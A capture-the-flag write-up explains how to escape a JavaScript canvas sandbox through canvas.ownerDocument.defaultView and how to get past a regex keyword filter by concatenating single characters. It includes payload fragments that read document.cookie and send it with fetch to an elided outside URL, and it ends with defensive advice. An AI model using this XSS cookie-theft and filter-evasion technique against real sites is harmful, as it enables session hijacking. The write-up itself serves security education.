🛠️ Analysis and Solution

📂 Step 1: Source Code Analysis

After extracting silicon-dioxide.zip, I examined the application's architecture. The challenge has two critical components: server-side filtering (app.js) and client-side sandboxing (index.js).

🔍 The Bot's Cookie Configuration

The most critical discovery was in the /share endpoint, where the admin bot visits our submitted code:

app.post("/share", async (req, res) => {
    const url = `http://localhost:${PORT}`;
    const code = req.body;

    if (!checkCode(code)) {
        res.send("Eww, that's some ugly code...");
        return;
    }

    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    
    // THE VULNERABILITY IS HERE!
    context.addCookies([
        {
            name: "flag",
            domain: "localhost",
            path: "/",
            value: FLAG,
            sameSite: "Lax",
            secure: false,
            httpOnly: false  // ❌ CRITICAL: Cookie is accessible via JavaScript!
        }
    ]);
    
    const page = await context.newPage();
    await page.goto(url + "?code=" + encodeURIComponent(code));

    setTimeout(async () => {
        await browser.close();
    }, 5000);

    setTimeout(async () => {
        res.send("Your code is... fine.");
    }, 1000);
});

🚨 Critical Vulnerability Found!

The httpOnly flag is set to false, which means JavaScript can access the flag cookie via document.cookie!

Normally, httpOnly: true prevents JavaScript from reading cookies, protecting against XSS attacks. But here, the flag is completely exposed!

🛡️ Step 2: Understanding the Defense Mechanisms

Now that I knew the goal (steal cookies via XSS), I needed to understand the two layers of protection:

🔒 Defense Layer 1: Server-Side Keyword Filter (app.js)

const allowed_keywords = [
    "const", "ctx", "canvas", "getContext", "console",
    "let", "vx", "vy", "radius", "function", "update",
    "clearRect", "width", "height", "if", "beginPath",
    "arc", "Math", "PI", "fillStyle", "orange", "fill",
    "requestAnimationFrame"
];

function checkCode(code) {
    // Extract all words with 2+ alphabetic characters
    const matches = code.match(/[A-Za-z]{2,}/g) || [];
    
    // Find words NOT in the allowed list
    const disallowed = matches.filter((k) => !allowed_keywords.includes(k));
    
    // Reject if any disallowed words found
    return disallowed.length === 0;
}

⚠️ Server-Side Filter: Only allows specific canvas-related keywords. Words like "window", "document", "fetch", "cookie" are blocked!

🔒 Defense Layer 2: Client-Side Sandbox (index.js)

⚠️ Client-Side Sandbox: All dangerous globals like window, document, fetch are shadowed with undefined. Even prototype chain access to constructor is blocked!

💡 Step 3: Finding the Sandbox Escape

The sandbox blocks direct access to window and document, but there's a DOM escape route!

🔓 Sandbox Escape Technique:

Since we have access to the canvas object (a DOM element), we can traverse the DOM to reach the window object:

canvas.ownerDocument.defaultView === window  // true!

This works because:

  • canvas.ownerDocument - Returns the document that owns the canvas
  • .defaultView - Returns the window object associated with the document

Now I had access to the real window object, which means I can access:

  • window.document - The DOM
  • window.document.cookie - The flag!
  • window.fetch - To exfiltrate data

🔧 Step 4: Bypassing the Keyword Filter

Now I could access window, but I still needed to bypass the server-side keyword filter. The filter blocks any word with 2+ consecutive letters that isn't in the allowed list.

✅ Bypass Strategy: String Concatenation!

Instead of writing blocked words directly, we split them into single characters and concatenate them:

// Blocked:
canvas.ownerDocument

// Allowed (single chars bypass the regex):
canvas['o'+'w'+'n'+'e'+'r'+'D'+'o'+'c'+'u'+'m'+'e'+'n'+'t']

The regex /[A-Za-z]{2,}/g only matches sequences of 2+ letters, so single-character strings pass through!

🎯 Technique Details

  • For accessing properties: Use bracket notation with concatenated strings
  • For string literals: Split into individual characters
  • For variable names: Use allowed keywords or single letters

Examples:

// Get window object
arc = canvas['o'+'w'+'n'+'e'+'r'+'D'+'o'+'c'+'u'+'m'+'e'+'n'+'t']['d'+'e'+'f'+'a'+'u'+'l'+'t'+'V'+'i'+'e'+'w'];

// Get document.cookie
arc['d'+'o'+'c'+'u'+'m'+'e'+'n'+'t']['c'+'o'+'o'+'k'+'i'+'e']

// Call fetch()
arc['f'+'e'+'t'+'c'+'h']('https://...')

💡 Variable Name Trick: I used arc and orange as variable names because they're in the allowed keywords list (canvas API terms)!

🔧 Technical Deep Dive

Understanding JavaScript Sandboxing

The challenge used a common sandboxing technique: shadowing dangerous globals with undefined:

const window = undefined;  // Shadows global window
const document = undefined;  // Shadows global document
// ... etc

This works because JavaScript's scope chain looks for variables in the local scope first. However, it doesn't prevent DOM-based access!

The DOM Escape Vector

Several DOM properties can provide access to the window object:

canvas.ownerDocument.defaultView === window
canvas.ownerDocument.defaultView.window === window
canvas.getRootNode().defaultView === window
canvas.baseURI → reveals document context

Why httpOnly is Critical

The httpOnly cookie flag is one of the most important XSS defenses:

Setting JavaScript Access XSS Impact
httpOnly: true ❌ Blocked ✅ Protected
httpOnly: false ✅ Allowed ❌ Vulnerable

Session cookies, authentication tokens, and flags should ALWAYS use httpOnly: true!

Regex Filter Weaknesses

The keyword filter used /[A-Za-z]{2,}/g which only matches 2+ consecutive letters:

✅ Matches (blocked): "window", "document", "fetch"
❌ Doesn't match (allowed): "w", "i", "n", "d", "o", "w"
❌ Doesn't match (allowed): 'w'+'i'+'n'+'d'+'o'+'w'

Better filters would:

  • Analyze the AST (Abstract Syntax Tree) instead of regex
  • Use a proper parser to detect string concatenation
  • Implement Content Security Policy (CSP)
  • Use strict sandboxing like iframes with sandbox attribute
